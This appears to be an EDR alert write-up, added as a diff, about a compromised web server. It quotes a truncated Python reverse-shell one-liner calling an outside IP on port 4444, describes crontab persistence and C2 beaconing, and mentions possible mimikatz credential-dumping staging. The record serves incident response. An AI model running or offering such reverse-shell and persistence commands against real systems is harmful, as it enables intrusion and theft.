@@ -1,0 +1,23 @@
+EDR Alert #55910 - Sysmon correlation
+Host: prod-web-03 (10.20.4.17)
+User: root
+
+Sysmon Event ID 1 (Process Create) logged the following on prod-web-03 at
+03:26 UTC, roughly a minute after an interactive root login via SSH:
+  ParentImage: /bin/bash
+  Image: /usr/bin/python3
+  CommandLine: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('185.220.101.1',4444))..."
+
+A scheduled task equivalent (root crontab entry) was created shortly after
+to re-establish this reverse shell every reboot, consistent with the
+persistence activity already logged by sshd/crontab on this host.
+
+Firewall logs show an outbound connection from 10.20.4.17 to 185.220.101.1
+on port 4444 immediately after the process launched, followed by periodic
+beacon-like traffic to hxxps://evil-c2-panel[.]com/checkin every ~5 minutes.
+
+A dropped file staged in /tmp was quarantined by EDR with hash
+44d88612fea8a8f36de82e1278abb02f (MD5), matching a known malware family in
+our threat intel feed. Analyst should confirm whether credential dumping
+tools such as mimikatz were staged given the persistence and C2 behavior
+observed, and whether the new local account (svc-updater) is legitimate.
